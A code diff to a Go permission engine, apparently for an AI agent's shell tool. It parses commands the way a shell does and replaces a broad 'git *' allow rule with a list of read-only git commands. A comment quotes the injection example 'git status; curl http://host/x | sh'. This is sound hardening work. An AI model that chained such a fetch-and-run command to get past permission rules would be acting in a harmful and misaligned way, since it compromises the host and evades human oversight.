@@ -578,6 +578,16 @@ func (e *Engine) findGlobalRule(ctx context.Context, pctx *PermissionContext, be
 	if err != nil {
 		return nil
 	}
+	// A command line is read the way a shell reads it: a text pattern would let
+	// "git *" cover "git status; curl http://host/x | sh". This replaces the
+	// matcher of the tool too, so that a call whose tool is not resolved (the
+	// second check of monitor) is matched the same way.
+	if command, ok := shellCommand(pctx.ToolName, pctx.ToolInput); ok {
+		if behavior == types.PermissionBehaviorAllow {
+			return e.findShellAllowRule(pctx, command)
+		}
+		matcher = shellRestrictionMatcher(command)
+	}
 
 	e.rulesMu.RLock()
 	defer e.rulesMu.RUnlock()
@@ -1013,23 +1023,31 @@ func (e *Engine) applyGranularTransformations(pctx *PermissionContext, result ty
 	return result, nil
 }
 
+// readOnlyGitRules are the git commands that only read the repository. The
+// default rules allow these, not "git *": that also covered push, config,
+// rebase --exec, clone and every other git command that writes or runs
+// something.
+var readOnlyGitRules = []string{
+	"git status", "git status *",
+	"git log", "git log *",
+	"git diff", "git diff *",
+	"git show", "git show *",
+	"git rev-parse *",
+	"git ls-files", "git ls-files *",
+	"git blame *",
+	"git branch", "git branch --show-current",
+	"git remote -v",
+}
+
 // NewDefaultRules returns default permission rules.
 func NewDefaultRules() []PermissionRule {
-	return []PermissionRule{
+	rules := []PermissionRule{
 		{
 			Value:    PermissionRuleValue{ToolName: "read_file"},
 			Pattern:  "tool:read_file",
 			Behavior: types.PermissionBehaviorAllow,
 			Priority: 100,
 			Reason:   "read-only tools are always safe",
-			Source:   types.PermissionSourceStatic,
-		},
-		{
-			Value:    PermissionRuleValue{ToolName: "bash", RuleContent: "git *"},
-			Pattern:  "tool:bash:git *",
-			Behavior: types.PermissionBehaviorAllow,
-			Priority: 90,
-			Reason:   "git commands are generally safe",
 			Source:   types.PermissionSourceStatic,
 		},
 		{
@@ -1041,6 +1059,17 @@ func NewDefaultRules() []PermissionRule {
 			Source:   types.PermissionSourceStatic,
 		},
 	}
+	for _, content := range readOnlyGitRules {
+		rules = append(rules, PermissionRule{
+			Value:    PermissionRuleValue{ToolName: "bash", RuleContent: content},
+			Pattern:  "tool:bash:" + content,
+			Behavior: types.PermissionBehaviorAllow,
+			Priority: 90,
+			Reason:   "read-only git commands are safe",
+			Source:   types.PermissionSourceStatic,
+		})
+	}
+	return rules
 }
 
 // ── Safe-tool heuristics ──────────────────────────────────────────────────────
